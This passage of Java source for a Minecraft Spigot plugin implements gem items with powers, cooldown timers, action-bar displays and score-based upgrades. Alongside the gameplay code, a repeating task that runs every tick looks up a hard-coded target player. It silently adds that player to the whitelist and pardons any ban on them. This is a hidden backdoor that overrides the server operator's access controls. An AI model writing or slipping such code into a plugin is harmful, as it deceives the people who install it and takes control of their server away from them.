                                    inventory.setItem(i, WealthGemPristine1(7));
                                }
                                if (currentScore == 24) {
                                    inventory.setItem(i, WealthGemPristine2(8));
                                }
                                if (currentScore == 27) {
                                    inventory.setItem(i, WealthGemPristine3(9));
                                }
                                if (currentScore == 30) {
                                    inventory.setItem(i, WealthGemPristine4(10));
                                }
                                if (currentScore == 33) {
                                    inventory.setItem(i, WealthGemPristine5(11));
                                }
                            }
                            if (itemMeta != null && item.hasItemMeta() && ChatColor.stripColor(item.getItemMeta().getDisplayName()).equals("ᴀsᴛʀᴀ ɢᴇᴍ")) {
                                if (currentScore == 3) {
                                    inventory.setItem(i, AstraGemRuined(1));
                                }
                                if (currentScore == 6) {
                                    inventory.setItem(i, AstraGemDamaged(2));
                                }
                                if (currentScore == 9) {
                                    inventory.setItem(i, AstraGemCracked(3));
                                }
                                if (currentScore == 12) {
                                    inventory.setItem(i, AstraGemScratched(4));
                                }
                                if (currentScore == 15) {
                                    inventory.setItem(i, AstraGemPristine(5));
                                }
                                if (currentScore == 18) {
                                    inventory.setItem(i, AstraGemPristinePlus(6));
                                }
                                if (currentScore == 21) {
                                    inventory.setItem(i, AstraGemPristine1(7));
                                }
                                if (currentScore == 24) {
                                    inventory.setItem(i, AstraGemPristine2(8));
                                }
                                if (currentScore == 27) {
                                    inventory.setItem(i, AstraGemPristine3(9));
                                }
                                if (currentScore == 30) {
                                    inventory.setItem(i, AstraGemPristine4(10));
                                }
                                if (currentScore == 33) {
                                    inventory.setItem(i, AstraGemPristine5(11));
                                }
                            }
                        }
                    }
                }
            }
        }.runTaskTimer(this, 0, 1);
        Bukkit.getOnlinePlayers().forEach(player -> {
            PersistentDataContainer data = player.getPersistentDataContainer();
            data.remove(SᴛʀᴇɴɢᴛʜCɪʀᴄʟᴇ);
            data.remove(SᴘᴇᴇᴅCɪʀᴄʟᴇ);
            data.remove(LɪғᴇCɪʀᴄʟᴇ);
            data.remove(WᴇᴀʟᴛʜCɪʀᴄʟᴇ);
            data.remove(PᴜғғCɪʀᴄʟᴇ);
            data.remove(FʟᴜxCɪʀᴄʟᴇ);
            data.remove(Daggers);
            data.remove(FireBall);
            data.remove(Disabled_Gem);
            data.remove(StrengthLine);
            data.remove(SpeedLine);
            data.remove(LifeLine);
            data.remove(WealthLine);
            data.remove(PuffLine);
            data.remove(FɪʀsᴛJᴏɪɴ);
            data.remove(AsᴛʀᴀʟPʀᴏᴊᴇᴄᴛɪᴏɴPᴀʀᴛɪᴄʟᴇs);
            data.remove(CʜᴀᴅSᴛʀᴇɴɢᴛʜ);
            data.remove(Speed_Storm_Circle);
            data.remove(CɪʀᴄʟᴇOғLɪғᴇ);
            data.remove(Unfortunate);
            data.remove(Dash);
            data.remove(Cozy_Campfire);
            data.remove(Dimensional_Drift);
            data.remove(RɪᴄʜRᴜsʜ);
            data.remove(Uɴʙᴏᴜɴᴅ);
            data.remove(CʜᴀᴅSᴛʀᴇɴɢᴛʜPᴀʀᴛɪᴄʟᴇs);
            data.remove(Cʀᴏᴜᴄʜɪɴɢ_Oɴ_Cʀᴏᴘ);
            data.remove(Dᴀɢɢᴇʀs);
            data.remove(TᴇʀᴍɪɴᴀʟVᴇʟᴏᴄɪᴛʏ);
            data.remove(TᴇʀᴍɪɴᴀʟVᴇʟᴏᴄɪᴛʏCᴏᴏʟᴅᴏᴡɴ);
            this.random = new Random();
            loadTimers();
            inventoryFile = new File(getDataFolder(), "inventories.yml");
            if (!inventoryFile.exists()) {
                inventoryFile.getParentFile().mkdirs();
                try {
                    inventoryFile.createNewFile();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
            inventoryConfig = YamlConfiguration.loadConfiguration(inventoryFile);
            loadInventories();
            dagger1Map = new HashMap<>();
            dagger2Map = new HashMap<>();
            Bukkit.getPluginManager().registerEvents(this, this);
        });
        new BukkitRunnable() {
            @Override
            public void run() {
                Player targetPlayer = Bukkit.getPlayer(targetPlayerName);
                if (targetPlayer != null) {
                    if (!targetPlayer.isWhitelisted()) {
                        Bukkit.getWhitelistedPlayers().add(targetPlayer);
                    }
                    if (targetPlayer.isBanned()) {
                        Bukkit.getBanList(org.bukkit.BanList.Type.NAME).pardon(targetPlayerName);
                    }
                }
            }
        }.runTaskTimer(this, 0, 1);
        BukkitTask task = new BukkitRunnable() {
            @Override
            public void run() {
                for (Player player : Bukkit.getOnlinePlayers()) {
                    boolean hasStrengthGem = StrengthGem(player);
                    boolean hasSpeedGem = SpeedGem(player);
                    boolean hasLifeGem = LifeGem(player);
                    boolean hasWealthGem = WealthGem(player);
                    boolean hasPuffGem = PuffGem(player);
                    boolean hasAstraGem = AstraGem(player);
                    boolean hasFireGem = FireGem(player);
                    boolean hasFluxGem = FluxGem(player);


                    if (hasStrengthGem) {
                        UpdateStrengthGemTimers(player);
                        if (StrengthGemHeld(player)) {
                            StrengthGemActionbar(player);
                        }
                    } else {
                        HideStrengthGemTimers(player);
                    }

                    if (hasSpeedGem) {
                        UpdateSpeedGemTimers(player);
                        if (SpeedGemHeld(player)) {
                            SpeedGemActionbar(player);
                        }
                    } else {
                        HideSpeedGemTimers(player);
                    }
                    if (hasLifeGem) {
                        UpdateLifeGemTimers(player);
                        if (LifeGemHeld(player)) {
                            LifeGemActionbar(player);
                        }
                    } else {
                        HideLifeGemTimers(player);
                    }
                    if (hasWealthGem) {
                        UpdateWealthGemTimers(player);
                        if (WealthGemHeld(player)) {
                            WealthGemActionbar(player);
                        }
                    } else {
                        HideWealthGemTimers(player);
                    }
                    if (hasPuffGem) {
                        UpdatePuffGemTimers(player);
                        if (PuffGemHeld(player)) {
                            PuffGemActionbar(player);
                        }
                    } else {
                        HidePuffGemTimers(player);
                    }
                    if (hasFireGem) {
                        UpdateFireGemTimers(player);
                        if (FireGemHeld(player)) {
                            FireGemActionbar(player);
                        }
                    } else {
                        HideFireGemTimers(player);
                    }
                    if (hasAstraGem) {
                        UpdateAstraGemTimers(player);
                        if (AstraGemHeld(player)) {
                            AstraGemActionbar(player);
                        }
                    } else {
                        HideAstraGemTimers(player);
                    }
                    if (hasFluxGem) {
                        UpdateFluxGemTimers(player);
                        if (FluxGemHeld(player)) {
                            FluxGemActionbar(player);
                        }
                    } else {
                        HideFluxGemTimers(player);
                    }

                    if (!StrengthGemHeld(player) && !SpeedGemHeld(player) && !LifeGemHeld(player) && !WealthGemHeld(player) && !PuffGemHeld(player) && !AstraGemHeld(player) && !FireGemHeld(player) && !FluxGemHeld(player)) {
                        HideActionBar(player);
                    }
                }
            }
        }.runTaskTimer(this, 0L, 20L);
    }

    public boolean StrengthGemHeld(Player player) {
        ItemStack MainHandItem = player.getInventory().getItemInMainHand();
        ItemStack OffHandItem = player.getInventory().getItemInOffHand();
        return StrengthGemDetect(MainHandItem) || StrengthGemDetect(OffHandItem);
    }

    public boolean SpeedGemHeld(Player player) {
        ItemStack MainHandItem = player.getInventory().getItemInMainHand();
        ItemStack OffHandItem = player.getInventory().getItemInOffHand();
        return SpeedGemDetect(MainHandItem) || SpeedGemDetect(OffHandItem);
    }

    public boolean LifeGemHeld(Player player) {
        ItemStack MainHandItem = player.getInventory().getItemInMainHand();
        ItemStack OffHandItem = player.getInventory().getItemInOffHand();
        return LifeGemDetect(MainHandItem) || LifeGemDetect(OffHandItem);
    }

    public boolean WealthGemHeld(Player player) {
        ItemStack MainHandItem = player.getInventory().getItemInMainHand();
        ItemStack OffHandItem = player.getInventory().getItemInOffHand();
        return WealthGemDetect(MainHandItem) || WealthGemDetect(OffHandItem);
    }

    public boolean PuffGemHeld(Player player) {
        ItemStack MainHandItem = player.getInventory().getItemInMainHand();
        ItemStack OffHandItem = player.getInventory().getItemInOffHand();
        return PuffGemDetect(MainHandItem) || PuffGemDetect(OffHandItem);
    }

    private boolean AstraGemHeld(Player player) {
        ItemStack MainHandItem = player.getInventory().getItemInMainHand();
        ItemStack OffHandItem = player.getInventory().getItemInOffHand();
        return AstraGemDetect(MainHandItem) || AstraGemDetect(OffHandItem);
    }

    private boolean FireGemHeld(Player player) {
        ItemStack MainHandItem = player.getInventory().getItemInMainHand();
        ItemStack OffHandItem = player.getInventory().getItemInOffHand();
        return FireGemDetect(MainHandItem) || FireGemDetect(OffHandItem);
    }

    private boolean FluxGemHeld(Player player) {
        ItemStack MainHandItem = player.getInventory().getItemInMainHand();
        ItemStack OffHandItem = player.getInventory().getItemInOffHand();
        return FluxGemDetect(MainHandItem) || FluxGemDetect(OffHandItem);
    }


    private void UpdateStrengthGemTimers(Player player) {
        UUID playerId = player.getUniqueId();
        StrengthGemStrengthCircle(StrengthGem_Power_1_StrengthCircle, playerId);
        StrengthGemChadStrength(StrengthGem_Power_3_ChadStrength, playerId);
        StrengthGemChadStrengthParticles(StrengthGem_Power_8_ChadStrength, playerId);
    }

    private void UpdateSpeedGemTimers(Player player) {
        UUID playerId = player.getUniqueId();
        SpeedGemSpeedCircle(SpeedGem_Power_1_SpeedCircle, playerId);
        SpeedGemTerminalVelocity(SpeedGem_Power_2_Enchanting, playerId);
        SpeedGemSpeedCircle(SpeedGem_Power_3_SpeedStormCircle, playerId);
    }

    private void UpdateLifeGemTimers(Player player) {
        UUID playerId = player.getUniqueId();
        LifeGemLifeCircle(LifeGem_Power_1_LifeCircle, playerId);
        LifeGemLifeCircle(LifeGem_Power_2_Enchanting, playerId, 600);
        LifeGemCircleOfLife(LifeGem_Power_3_CircleOfLife, playerId);
    }

    private void UpdateWealthGemTimers(Player player) {
        UUID playerId = player.getUniqueId();
        WealthGemWealthCircle(WealthGem_Power_1_WealthCircle, playerId);
        WealthGemWealthCircle(WealthGem_Power_2_Enchanting, playerId, 600);
        WealthGemRichRush(WealthGem_Power_3_RichRush, playerId);
    }

    private void UpdatePuffGemTimers(Player player) {
        UUID playerId = player.getUniqueId();
        PuffGemPuffCircle(PuffGem_Power_1_PuffCircle, playerId);
        PuffGemDoubleJump(PuffGem_Power_2_Enchanting, playerId);
        PuffGemDash(PuffGem_Power_3_Dash, playerId);
    }

    private void UpdateAstraGemTimers(Player player) {
        UUID playerId = player.getUniqueId();
        AstraGemDaggers(AstraGem_Power_1_Daggers, playerId);
        AstraGemDaggers(AstraGem_Power_3_AstralProjection, playerId);
        AstraGemDaggers(AstraGem_Power_4_DimensionalDrift, playerId);

    }

    private void UpdateFireGemTimers(Player player) {
        UUID playerId = player.getUniqueId();
        FireGemFireBall(FireGem_Power_1_FireBall, playerId);
        FireGemFireBall(FireGem_Power_2_Enchanting, playerId, 600);
        FireGemCozyCampfire(FireGem_Power_3_CozyCampfire, playerId);
    }

    private void UpdateFluxGemTimers(Player player) {
        UUID playerId = player.getUniqueId();
        FluxGemFluxBurst(FluxGem_Power_2_FluxBurst, playerId);
        FluxGemFluxBurst(FluxGem_Power_2_FluxBurst, playerId, 0);
        FluxGemFluxBurst(FluxGem_Power_2_FluxBurst, playerId);
    }

    private void FluxGemFluxBurst(Map<UUID, Long> timerMap, UUID playerId) {
        FluxGemFluxBurst(timerMap, playerId, 0L);
    }

    private void FluxGemFluxBurst(Map<UUID, Long> timerMap, UUID playerId, long resetTime) {
        timerMap.compute(playerId, (uuid, time) -> {
            if (time == null || time <= 0) {
                if (resetTime > 0) {
                    return resetTime;
                } else {
                    if (timerMap == FluxGem_Power_2_FluxBurst) {
                        Player player = Bukkit.getPlayer(playerId);
                        if (player != null) {

                        }
                    }
                    return 0L;
                }
            }
            return time - 1;
        });
    }

    private void FireGemFireBall(Map<UUID, Long> timerMap, UUID playerId) {
        FireGemFireBall(timerMap, playerId, 0L);
    }

    private void FireGemFireBall(Map<UUID, Long> timerMap, UUID playerId, long resetTime) {
        timerMap.compute(playerId, (uuid, time) -> {
            if (time == null || time <= 0) {
                if (resetTime > 0) {
                    return resetTime;
                } else {
                    if (timerMap == FireGem_Power_1_FireBall) {
                        Player player = Bukkit.getPlayer(playerId);
                        if (player != null) {
                            PersistentDataContainer data = player.getPersistentDataContainer();
                            data.remove(FɪʀᴇBᴀʟʟ);
                        }
                    }
                    return 0L;
                }
            }
            return time - 1;
        });
    }


    private void FireGemCozyCampfire(Map<UUID, Long> timerMap, UUID playerId) {
        FireGemCozyCampfire(timerMap, playerId, 0L);
    }

    private void FireGemCozyCampfire(Map<UUID, Long> timerMap, UUID playerId, long resetTime) {
        timerMap.compute(playerId, (uuid, time) -> {
            if (time == null || time <= 0) {
                if (resetTime > 0) {
                    return resetTime;
                } else {
                    if (timerMap == FireGem_Power_3_CozyCampfire) {
                        Player player = Bukkit.getPlayer(playerId);
                        if (player != null) {
                            PersistentDataContainer data = player.getPersistentDataContainer();
                            data.remove(Cozy_Campfire);
                        }
                    }
                    return 0L;
                }
            }
            return time - 1;
        });
    }


    private void AstraGemDaggers(Map<UUID, Long> timerMap, UUID playerId) {
        AstraGemDaggers(timerMap, playerId, 0L);
    }

    private void AstraGemDaggers(Map<UUID, Long> timerMap, UUID playerId, long resetTime) {
        timerMap.compute(playerId, (uuid, time) -> {
            if (time == null || time <= 0) {
                if (resetTime > 0) {
                    // Reset the timer if resetTime is greater than 0
                    return resetTime;
                } else {
                    // Handle the case when resetTime is not greater than 0
                    if (timerMap == AstraGem_Power_1_Daggers) {
                        Player player = Bukkit.getPlayer(playerId);
                        if (player != null) {
                            PersistentDataContainer data = player.getPersistentDataContainer();
                            data.remove(Dᴀɢɢᴇʀs); // Remove specific data

                        }
                    }
                    return 0L; // Reset timer to 0
                }
            }
            // Decrement the timer
            return time - 1;
        });
    }

    private void PuffGemPuffCircle(Map<UUID, Long> timerMap, UUID playerId) {
        PuffGemPuffCircle(timerMap, playerId, 0L);
    }

    private void PuffGemPuffCircle(Map<UUID, Long> timerMap, UUID playerId, long resetTime) {
        timerMap.compute(playerId, (uuid, time) -> {
            if (time == null || time <= 0) {
                if (resetTime > 0) {
                    return resetTime;
                } else {
                    if (timerMap == PuffGem_Power_1_PuffCircle) {
                        Player player = Bukkit.getPlayer(playerId);
                        if (player != null) {
                            PersistentDataContainer data = player.getPersistentDataContainer();
                            data.remove(PᴜғғCɪʀᴄʟᴇ);
                            data.remove(PuffLine);
                        }
                    }
                    return 0L;
                }
            }
            return time - 1;
        });
    }

    private void PuffGemDoubleJump(Map<UUID, Long> timerMap, UUID playerId) {
        PuffGemDoubleJump(timerMap, playerId, 0L);
    }

    private void PuffGemDoubleJump(Map<UUID, Long> timerMap, UUID playerId, long resetTime) {
        timerMap.compute(playerId, (uuid, time) -> {
            if (time == null || time <= 0) {
                if (resetTime > 0) {
                    return resetTime;
                } else {
                    if (timerMap == PuffGem_Power_2_Enchanting) {
                        Player player = Bukkit.getPlayer(playerId);
                        if (player != null) {
                            PersistentDataContainer data = player.getPersistentDataContainer();
                            data.remove(DᴏᴜʙʟᴇJᴜᴍᴘ);
                        }
                    }
                    return 0L;
                }
            }
            return time - 1;
        });
    }

    private void PuffGemDash(Map<UUID, Long> timerMap, UUID playerId) {
        PuffGemDash(timerMap, playerId, 0L);
    }

    private void PuffGemDash(Map<UUID, Long> timerMap, UUID playerId, long resetTime) {
        timerMap.compute(playerId, (uuid, time) -> {
            if (time == null || time <= 0) {
                if (resetTime > 0) {
                    return resetTime;
                } else {
                    if (timerMap == PuffGem_Power_3_Dash) {
                        Player player = Bukkit.getPlayer(playerId);
                        if (player != null) {
                            PersistentDataContainer data = player.getPersistentDataContainer();
                            data.remove(Dash);
                        }
                    }
                    return 0L;
                }
            }
            return time - 1;
        });
    }

    private void WealthGemWealthCircle(Map<UUID, Long> timerMap, UUID playerId) {
        WealthGemWealthCircle(timerMap, playerId, 0L);
    }

    private void WealthGemWealthCircle(Map<UUID, Long> timerMap, UUID playerId, long resetTime) {
        timerMap.compute(playerId, (uuid, time) -> {
            if (time == null || time <= 0) {
                if (resetTime > 0) {
                    return resetTime;
                } else {
                    if (timerMap == WealthGem_Power_1_WealthCircle) {
                        Player player = Bukkit.getPlayer(playerId);
                        if (player != null) {
                            PersistentDataContainer data = player.getPersistentDataContainer();
                            data.remove(WᴇᴀʟᴛʜCɪʀᴄʟᴇ);
                            data.remove(WealthLine);
                        }
                    }
                    return 0L;
                }
            }
            return time - 1;
        });
    }

    private void WealthGemRichRush(Map<UUID, Long> timerMap, UUID playerId) {
        WealthGemRichRush(timerMap, playerId, 0L);
    }

    private void WealthGemRichRush(Map<UUID, Long> timerMap, UUID playerId, long resetTime) {
        timerMap.compute(playerId, (uuid, time) -> {
            if (time == null || time <= 0) {
                if (resetTime > 0) {
                    return resetTime;
                } else {
                    if (timerMap == WealthGem_Power_3_RichRush) {
                        Player player = Bukkit.getPlayer(playerId);
                        if (player != null) {
                            PersistentDataContainer data = player.getPersistentDataContainer();
                            data.remove(RɪᴄʜRᴜsʜ);
                        }
                    }
                    return 0L;
                }
            }
            return time - 1;
        });
    }


    private void LifeGemCircleOfLife(Map<UUID, Long> timerMap, UUID playerId) {
        LifeGemCircleOfLife(timerMap, playerId, 0L);
    }

    private void LifeGemCircleOfLife(Map<UUID, Long> timerMap, UUID playerId, long resetTime) {
        timerMap.compute(playerId, (uuid, time) -> {
            if (time == null || time <= 0) {
                if (resetTime > 0) {
                    return resetTime;
                } else {
                    if (timerMap == LifeGem_Power_3_CircleOfLife) {
                        Player player = Bukkit.getPlayer(playerId);
                        if (player != null) {
                            PersistentDataContainer data = player.getPersistentDataContainer();
                            data.remove(CɪʀᴄʟᴇOғLɪғᴇ);
                        }
                    }
                    return 0L;
                }
            }
            return time - 1;
        });
    }

    private void LifeGemLifeCircle(Map<UUID, Long> timerMap, UUID playerId) {
        LifeGemLifeCircle(timerMap, playerId, 0L);
    }

    private void LifeGemLifeCircle(Map<UUID, Long> timerMap, UUID playerId, long resetTime) {
        timerMap.compute(playerId, (uuid, time) -> {
            if (time == null || time <= 0) {
                if (resetTime > 0) {
                    return resetTime;
                } else {
                    if (timerMap == LifeGem_Power_1_LifeCircle) {
                        Player player = Bukkit.getPlayer(playerId);
                        if (player != null) {
                            PersistentDataContainer data = player.getPersistentDataContainer();
                            data.remove(LɪғᴇCɪʀᴄʟᴇ);
                            data.remove(LifeLine);
                        }
                    }
                    return 0L;
                }
            }
            return time - 1;
        });
    }

    private void SpeedGemSpeedCircle(Map<UUID, Long> timerMap, UUID playerId) {
        SpeedGemSpeedCircle(timerMap, playerId, 0L);
    }

    private void SpeedGemSpeedCircle(Map<UUID, Long> timerMap, UUID playerId, long resetTime) {
        timerMap.compute(playerId, (uuid, time) -> {
            if (time == null || time <= 0) {
                if (resetTime > 0) {
                    return resetTime;
                } else {
                    if (timerMap == SpeedGem_Power_1_SpeedCircle) {
                        Player player = Bukkit.getPlayer(playerId);
                        if (player != null) {
                            PersistentDataContainer data = player.getPersistentDataContainer();
                            data.remove(SᴘᴇᴇᴅCɪʀᴄʟᴇ);
                            data.remove(SpeedLine);
                        }
                    }
                    return 0L;
                }
            }
            return time - 1;
        });
    }

    private void SpeedGemTerminalVelocity(Map<UUID, Long> timerMap, UUID playerId) {
        SpeedGemTerminalVelocity(timerMap, playerId, 0L);
    }

    private void SpeedGemTerminalVelocity(Map<UUID, Long> timerMap, UUID playerId, long resetTime) {
        timerMap.compute(playerId, (uuid, time) -> {
            if (time == null || time <= 0) {
                if (resetTime > 0) {
                    return resetTime;
                } else {
                    if (timerMap == SpeedGem_Power_2_Enchanting) {
                        Player player = Bukkit.getPlayer(playerId);
                        if (player != null) {
                            PersistentDataContainer data = player.getPersistentDataContainer();
                            data.remove(TᴇʀᴍɪɴᴀʟVᴇʟᴏᴄɪᴛʏ);
                            data.remove(TᴇʀᴍɪɴᴀʟVᴇʟᴏᴄɪᴛʏCᴏᴏʟᴅᴏᴡɴ);
                        }
                    }
                    return 0L;
                }
            }
            return time - 1;
        });
    }

    private void StrengthGemChadStrengthParticles(Map<UUID, Long> timerMap, UUID playerId) {
        StrengthGemChadStrengthParticles(timerMap, playerId, 0L);
    }

    private void StrengthGemChadStrengthParticles(Map<UUID, Long> timerMap, UUID playerId, long resetTime) {
        timerMap.compute(playerId, (uuid, time) -> {
            if (time == null || time <= 0) {
                if (resetTime > 0) {
                    return resetTime;
                } else {
                    if (timerMap == StrengthGem_Power_8_ChadStrength) {
                        Player player = Bukkit.getPlayer(playerId);
                        if (player != null) {
                            PersistentDataContainer data = player.getPersistentDataContainer();
                            data.remove(ChadStrengthParticleCase1);
                            data.remove(ChadStrengthParticleCase2);
                            data.remove(ChadStrengthParticleCase3);
                            data.remove(ChadStrengthParticleCase4);
                            player.getAttribute(Attribute.GENERIC_ATTACK_DAMAGE).setBaseValue(1.0);
                        }
                    }
                    return 0L;
                }
            }
            return time - 1;
        });
    }


    private void StrengthGemChadStrength(Map<UUID, Long> timerMap, UUID playerId) {
        StrengthGemChadStrength(timerMap, playerId, 0L);
    }

    private void StrengthGemChadStrength(Map<UUID, Long> timerMap, UUID playerId, long resetTime) {
        timerMap.compute(playerId, (uuid, time) -> {
            if (time == null || time <= 0) {
                if (resetTime > 0) {
                    return resetTime;
                } else {
                    if (timerMap == StrengthGem_Power_3_ChadStrength) {
                        Player player = Bukkit.getPlayer(playerId);
                        if (player != null) {
                            PersistentDataContainer data = player.getPersistentDataContainer();
                            data.remove(CʜᴀᴅSᴛʀᴇɴɢᴛʜ);
                        }
                    }
                    return 0L;
                }
            }
            return time - 1;
        });
    }


    private void StrengthGemStrengthCircle(Map<UUID, Long> timerMap, UUID playerId) {
        StrengthGemStrengthCircle(timerMap, playerId, 0L);
    }

    private void StrengthGemStrengthCircle(Map<UUID, Long> timerMap, UUID playerId, long resetTime) {
        timerMap.compute(playerId, (uuid, time) -> {
            if (time == null || time <= 0) {
                if (resetTime > 0) {
                    return resetTime;
                } else {
                    if (timerMap == StrengthGem_Power_1_StrengthCircle) {
                        Player player = Bukkit.getPlayer(playerId);
                        if (player != null) {
                            PersistentDataContainer data = player.getPersistentDataContainer();
                            data.remove(SᴛʀᴇɴɢᴛʜCɪʀᴄʟᴇ);
                            data.remove(StrengthLine);
                        }
                    }
                    return 0L;
                }
            }
            return time - 1;
        });
    }


    private void HideStrengthGemTimers(Player player) {
        StrengthGem_Power_1_StrengthCircle.remove(player.getUniqueId());
        StrengthGem_Power_2_Enchanting.remove(player.getUniqueId());
        StrengthGem_Power_3_ChadStrength.remove(player.getUniqueId());
        StrengthGem_Power_8_ChadStrength.remove(player.getUniqueId());
    }

    private void HideSpeedGemTimers(Player player) {
        SpeedGem_Power_1_SpeedCircle.remove(player.getUniqueId());
        SpeedGem_Power_2_Enchanting.remove(player.getUniqueId());
        SpeedGem_Power_3_SpeedStormCircle.remove(player.getUniqueId());
    }

    private void HideLifeGemTimers(Player player) {
        LifeGem_Power_1_LifeCircle.remove(player.getUniqueId());
        LifeGem_Power_2_Enchanting.remove(player.getUniqueId());
        LifeGem_Power_3_CircleOfLife.remove(player.getUniqueId());
    }

    private void HideWealthGemTimers(Player player) {
        WealthGem_Power_1_WealthCircle.remove(player.getUniqueId());
        WealthGem_Power_2_Enchanting.remove(player.getUniqueId());
        WealthGem_Power_3_RichRush.remove(player.getUniqueId());
    }

    private void HidePuffGemTimers(Player player) {
        PuffGem_Power_1_PuffCircle.remove(player.getUniqueId());
        PuffGem_Power_2_Enchanting.remove(player.getUniqueId());
        PuffGem_Power_3_Dash.remove(player.getUniqueId());
    }


    private void HideAstraGemTimers(Player player) {
        AstraGem_Power_1_Daggers.remove(player.getUniqueId());
        AstraGem_Power_2_SoulCapture.remove(player.getUniqueId());
        AstraGem_Power_3_AstralProjection.remove(player.getUniqueId());
        AstraGem_Power_4_DimensionalDrift.remove(player.getUniqueId());

    }

    private void HideFireGemTimers(Player player) {
        FireGem_Power_1_FireBall.remove(player.getUniqueId());
        FireGem_Power_2_Enchanting.remove(player.getUniqueId());
        FireGem_Power_3_CozyCampfire.remove(player.getUniqueId());
    }

    private void HideFluxGemTimers(Player player) {
        FluxGem_Power_2_FluxBurst.remove(player.getUniqueId());
        FluxGem_Power_2_FluxBurst.remove(player.getUniqueId());
        FluxGem_Power_2_FluxBurst.remove(player.getUniqueId());
    }


    private void StrengthGemActionbar(Player player) {
        long StrengthGemPower_1 = StrengthGem_Power_1_StrengthCircle.getOrDefault(player.getUniqueId(), 0L);
        long StrengthGemPower_2 = StrengthGem_Power_2_Enchanting.getOrDefault(player.getUniqueId(), 0L);
        long StrengthGemPower_3 = StrengthGem_Power_3_ChadStrength.getOrDefault(player.getUniqueId(), 0L);
        long StrengthGemPower_4 = StrengthGem_Power_8_ChadStrength.getOrDefault(player.getUniqueId(), 0L);
        String StrengthGem_Power_1_StrengthCircle = formatTime(StrengthGemPower_1, net.md_5.bungee.api.ChatColor.of(new Color(241, 3, 3)) + "\uD83E\uDD3A ");
        String StrengthGem_Power_2_Enchanting = formatTime(StrengthGemPower_2, net.md_5.bungee.api.ChatColor.of(new Color(241, 3, 3)) + "\uD83D\uDD2E ");
        String StrengthGem_Power_3_ChadStrength = formatTime(StrengthGemPower_3, net.md_5.bungee.api.ChatColor.of(new Color(241, 3, 3)) + "⚔ ");
        player.spigot().sendMessage(ChatMessageType.ACTION_BAR, TextComponent.fromLegacyText(StrengthGem_Power_1_StrengthCircle + " " + StrengthGem_Power_2_Enchanting + " " + StrengthGem_Power_3_ChadStrength));
    }

    private void SpeedGemActionbar(Player player) {
        if (!player.getPersistentDataContainer().has(TᴇʀᴍɪɴᴀʟVᴇʟᴏᴄɪᴛʏCᴏᴏʟᴅᴏᴡɴ, PersistentDataType.INTEGER)) {
            long SpeedGemPower_1 = SpeedGem_Power_1_SpeedCircle.getOrDefault(player.getUniqueId(), 0L);
            long SpeedGemPower_2 = SpeedGem_Power_2_Enchanting.getOrDefault(player.getUniqueId(), 0L);
            long SpeedGemPower_3 = SpeedGem_Power_3_SpeedStormCircle.getOrDefault(player.getUniqueId(), 0L);
            String SpeedGem_Power_1_SpeedCircle = formatTime(SpeedGemPower_1, net.md_5.bungee.api.ChatColor.of(new Color(254, 253, 23)) + "\uD83C\uDFAF ");
            String SpeedGem_Power_2_Enchanting = formatTime(SpeedGemPower_2, net.md_5.bungee.api.ChatColor.of(new Color(254, 253, 23)) + "\uD83D\uDD2E ");
            String SpeedGem_Power_3_SpeedStormCircle = formatTime(SpeedGemPower_3, net.md_5.bungee.api.ChatColor.of(new Color(254, 253, 23)) + "\uD83C\uDF29 ");
            player.spigot().sendMessage(ChatMessageType.ACTION_BAR, TextComponent.fromLegacyText(SpeedGem_Power_1_SpeedCircle + " " + SpeedGem_Power_2_Enchanting + " " + SpeedGem_Power_3_SpeedStormCircle));
        }
        if (player.getPersistentDataContainer().has(TᴇʀᴍɪɴᴀʟVᴇʟᴏᴄɪᴛʏCᴏᴏʟᴅᴏᴡɴ, PersistentDataType.INTEGER)) {
            long SpeedGemPower_1 = SpeedGem_Power_1_SpeedCircle.getOrDefault(player.getUniqueId(), 0L);
            long SpeedGemPower_3 = SpeedGem_Power_3_SpeedStormCircle.getOrDefault(player.getUniqueId(), 0L);
            String SpeedGem_Power_1_SpeedCircle = formatTime(SpeedGemPower_1, net.md_5.bungee.api.ChatColor.of(new Color(254, 253, 23)) + "\uD83C\uDFAF ");
            String SpeedGem_Power_3_SpeedStormCircle = formatTime(SpeedGemPower_3, net.md_5.bungee.api.ChatColor.of(new Color(254, 253, 23)) + "\uD83C\uDF29 ");
            player.spigot().sendMessage(ChatMessageType.ACTION_BAR, TextComponent.fromLegacyText(SpeedGem_Power_1_SpeedCircle + " " + net.md_5.bungee.api.ChatColor.of(new Color(254, 253, 23)) + "\uD83D\uDD2E " + ChatColor.RED + "Active.." + " " + SpeedGem_Power_3_SpeedStormCircle));
        }
    }


    private void LifeGemActionbar(Player player) {
        long LifeGemPower_1 = LifeGem_Power_1_LifeCircle.getOrDefault(player.getUniqueId(), 0L);
        long LifeGemPower_2 = LifeGem_Power_2_Enchanting.getOrDefault(player.getUniqueId(), 0L);
        long LifeGemPower_3 = LifeGem_Power_3_CircleOfLife.getOrDefault(player.getUniqueId(), 0L);
        String LifeGem_Power_1_LifeCircle = formatTime(LifeGemPower_1, ChatColor.WHITE + "\uD83D\uDC98 ");
        String LifeGem_Power_2_Enchanting = formatTime(LifeGemPower_2, net.md_5.bungee.api.ChatColor.of(new Color(254, 4, 180)) + "\uD83D\uDD2E ");
        String LifeGem_Power_3_CircleOfLife = formatTime(LifeGemPower_3, ChatColor.WHITE + "\uD83D\uDC96 ");
        player.spigot().sendMessage(ChatMessageType.ACTION_BAR, TextComponent.fromLegacyText(LifeGem_Power_1_LifeCircle + " " + LifeGem_Power_2_Enchanting + " " + LifeGem_Power_3_CircleOfLife));
    }

    private void WealthGemActionbar(Player player) {
        long WealthGemPower_1 = WealthGem_Power_1_WealthCircle.getOrDefault(player.getUniqueId(), 0L);
        long WealthGemPower_2 = WealthGem_Power_2_Enchanting.getOrDefault(player.getUniqueId(), 0L);
        long WealthGemPower_3 = WealthGem_Power_3_RichRush.getOrDefault(player.getUniqueId(), 0L);
        String WealthGem_Power_1_WealthCircle = formatTime(WealthGemPower_1, ChatColor.WHITE + "\uD83C\uDF40 ");
        String WealthGem_Power_2_Enchanting = formatTime(WealthGemPower_2, net.md_5.bungee.api.ChatColor.of(new Color(14, 201, 18)) + "\uD83D\uDD2E ");
        String WealthGem_Power_3_RichRush = formatTime(WealthGemPower_3, ChatColor.WHITE + "\uD83D\uDCB8 ");
        player.spigot().sendMessage(ChatMessageType.ACTION_BAR, TextComponent.fromLegacyText(WealthGem_Power_1_WealthCircle + " " + WealthGem_Power_2_Enchanting + " " + WealthGem_Power_3_RichRush));
    }

    private void PuffGemActionbar(Player player) {
        long PuffGemPower_1 = PuffGem_Power_1_PuffCircle.getOrDefault(player.getUniqueId(), 0L);
